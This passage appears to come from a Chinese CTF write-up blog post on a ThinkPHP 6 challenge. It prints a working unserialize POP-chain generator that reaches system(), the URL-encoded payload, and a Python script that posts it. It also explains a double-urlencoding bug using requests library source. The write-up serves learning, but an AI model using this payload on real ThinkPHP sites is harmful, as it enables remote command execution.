class=\"line\">                <span class=\"string\">&quot;Streamed bodies and files are mutually exclusive.&quot;</span></span><br><span class=\"line\">            )</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> length:</span><br><span class=\"line\">            self.headers[<span class=\"string\">&quot;Content-Length&quot;</span>] = builtin_str(length)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.headers[<span class=\"string\">&quot;Transfer-Encoding&quot;</span>] = <span class=\"string\">&quot;chunked&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># Multi-part file uploads.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> files:</span><br><span class=\"line\">            (body, content_type) = self._encode_files(files, data)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> data:</span><br><span class=\"line\">                body = self._encode_params(data)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(data, basestring) <span class=\"keyword\">or</span> <span class=\"built_in\">hasattr</span>(data, <span class=\"string\">&quot;read&quot;</span>):</span><br><span class=\"line\">                    content_type = <span class=\"literal\">None</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    content_type = <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        self.prepare_content_length(body)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Add content-type if it wasn&#x27;t explicitly provided.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> content_type <span class=\"keyword\">and</span> (<span class=\"string\">&quot;content-type&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> self.headers):</span><br><span class=\"line\">            self.headers[<span class=\"string\">&quot;Content-Type&quot;</span>] = content_type</span><br><span class=\"line\"></span><br><span class=\"line\">    self.body = body</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，<code>data</code> 参数会被 <code>self._encode_params</code> 处理，再看 <code>self._encode_params</code>：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@staticmethod</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_encode_params</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Encode parameters in a piece of data.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Will successfully encode parameters when passed as a dict or a list of</span></span><br><span class=\"line\"><span class=\"string\">    2-tuples. Order is retained if data is a list of 2-tuples but arbitrary</span></span><br><span class=\"line\"><span class=\"string\">    if parameters are supplied as a dict.</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(data, (<span class=\"built_in\">str</span>, <span class=\"built_in\">bytes</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(data, <span class=\"string\">&quot;read&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(data, <span class=\"string\">&quot;__iter__&quot;</span>):</span><br><span class=\"line\">        result = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k, vs <span class=\"keyword\">in</span> to_key_val_list(data):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(vs, basestring) <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> <span class=\"built_in\">hasattr</span>(vs, <span class=\"string\">&quot;__iter__&quot;</span>):</span><br><span class=\"line\">                vs = [vs]</span><br><span class=\"line\">            <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> vs:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> v <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                    result.append(</span><br><span class=\"line\">                        (</span><br><span class=\"line\">                            k.encode(<span class=\"string\">&quot;utf-8&quot;</span>) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(k, <span class=\"built_in\">str</span>) <span class=\"keyword\">else</span> k,</span><br><span class=\"line\">                            v.encode(<span class=\"string\">&quot;utf-8&quot;</span>) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(v, <span class=\"built_in\">str</span>) <span class=\"keyword\">else</span> v,</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urlencode(result, doseq=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data</span><br></pre></td></tr></table></figure>\n\n<p>其中</p>\n","excerpt":"<p>两年前的意难平。</p>","more":"<hr>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>当时 pop 链都找到了，就是打不通，hackbar 和 python 都不行，成了一个疙瘩，正好现在全面转 web 安全了，把这根刺拔了先。</p>\n<h2 id=\"题解\"><a href=\"#题解\" class=\"headerlink\" title=\"题解\"></a>题解</h2><p>最近渗透做多了，看到题目就想扫目录（<br>直接访问 <code>www.zip</code> 就能把源码下下来，看到 <code>app/controller/Index.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">app</span>\\<span class=\"title class_\">controller</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">app</span>\\<span class=\"title\">BaseController</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Index</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseController</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V&#x27;</span> . \\think\\facade<span class=\"title class_\">\\App</span>::<span class=\"title function_ invoke__\">version</span>() . <span class=\"string\">&#x27;&lt;br/&gt;&lt;span style=&quot;font-size:30px;&quot;&gt;14载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:25px;&quot;&gt;[ V6.0 版本由 &lt;a href=&quot;https://www.yisu.com/&quot; target=&quot;yisu&quot;&gt;亿速云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ee9b1aa918103c4fc&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hello</span>(<span class=\"params\"><span class=\"variable\">$name</span> = <span class=\"string\">&#x27;ThinkPHP6&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;hello,&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;a&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可知路由为 <code>Index/test</code>，用 POST 传进参数 <code>a</code>，用这个 <a href=\"https://www.freebuf.com/vuls/321546.html\">PoC</a> 生成一个 payload，然后用 burp 发包，得到 flag。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\">        <span class=\"title class_\">private</span> $<span class=\"title class_\">lazySave</span> = <span class=\"title class_\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$exists</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$table</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$withAttr</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$json</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$jsonAssoc</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$obj</span> = <span class=\"string\">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;lazySave = True;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;dir&#x27;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;exists = True;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;table = <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;withAttr = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;system&#x27;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;json = [<span class=\"string\">&#x27;whoami&#x27;</span>,[<span class=\"string\">&#x27;whoami&#x27;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;jsonAssoc = True;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> &#123;</span><br><span class=\"line\">    <span class=\"title class_\">echo</span>(<span class=\"title class_\">base64_encode</span>(<span class=\"title class_\">serialize</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>()))));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D </span><br></pre></td></tr></table></figure>\n\n<p>把 <code>dir</code> 换成 <code>cat /flag</code> 即可。</p>\n<p>现在分析为什么我当初用 python 不行，这是我的 python 代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;&lt;url&gt;/Index/test&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Type&quot;</span>: <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;a&quot;</span>: <span class=\"string\">r&quot;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">res = requests.post(url, data=data, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(res.text)</span><br></pre></td></tr></table></figure>\n\n<p><code>print(requests.Request(&#39;POST&#39;, url, data=data, headers=headers).prepare().body)</code> 查看请求体后发现 payload 长这样了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=O%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253BO%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253Bs%253A0%253A%2522%2522%253Bs%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257Ds%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257D</span><br></pre></td></tr></table></figure>\n\n<p>也就是说，它又被 urlencode 了一次，所以应该直接写成如下形式：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = <span class=\"string\">&quot;a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D &quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h2><p>跟进 <code>requests.Request</code>，可以看到如下代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">prepare_body</span>(<span class=\"params\">self, data, files, json=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Prepares the given HTTP body data.&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Check if file, fo, generator, iterator.</span></span><br><span class=\"line\">    <span class=\"comment\"># If not, run through normal process.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Nottin&#x27; on you.</span></span><br><span class=\"line\">    body = <span class=\"literal\">None</span></span><br><span class=\"line\">    content_type = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> data <span class=\"keyword\">and</span> json <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"comment\"># urllib3 requires a bytes-like body. Python 2&#x27;s json.dumps</span></span><br><span class=\"line\">        <span class=\"comment\"># provides this natively, but Python 3 gives a Unicode string.</span></span><br><span class=\"line\">        content_type = <span class=\"string\">&quot;application/json&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            body = complexjson.dumps(json, allow_nan=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> ValueError <span class=\"keyword\">as</span> ve:</span><br><span class=\"line\">            <span 